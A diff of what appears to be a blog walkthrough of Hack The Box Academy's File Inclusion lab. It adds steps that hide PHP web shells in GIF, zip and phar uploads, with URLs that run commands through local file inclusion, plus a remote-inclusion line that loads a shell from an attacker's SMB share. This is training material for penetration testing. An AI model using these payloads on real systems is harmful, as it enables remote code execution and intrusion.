@@ -2,7 +2,7 @@
 layout: post
 title:  "Hack The Box - Academy - File Inclusion"
 description: "Explore this detailed walkthrough of Hack The Box Academy's File Inclusion module. Learn effective techniques to perform Local file inclusion (LFI), Remote File Inclusion (RFI) and elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
-date:   2024-11-28 21:05
+date:   2024-12-03 21:05
 image:  /images/htb/file-inclusion/logo.png
 tags:   [lfi,rfi,cbbh]
 categories: [htbacademy]
@@ -174,3 +174,56 @@ http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoa
 ## LFI and File Uploads
 
 > Use any of the techniques covered in this section to gain RCE and read the flag at /
+
+### Image Upload:
+
+Create a malicious image containing a PHP web shell code:
+
+```
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+Upload the malicious GIF file through the profile picture upload feature. After the upload is successful, navigate to the main page and apply the local file inclusion techniques covered in previous modules to execute the malicious shell.gif file.
+
+```
+http://{TARGET_IP}{TARGET_PORT}/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+### Zip Upload
+
+Create malicious zip file and use php zip wrapper to access the RCE.
+
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+```
+http://{TARGET_IP}{TARGET_PORT}/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+### Phar Upload
+
+Create a new php file with below script:
+
+```
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+Compile the script into a phar file and rename it to shell.jpg as follows:
+
+```
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+```
+http://{TARGET_IP}{TARGET_PORT}/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+
+
+## Log Poisoning
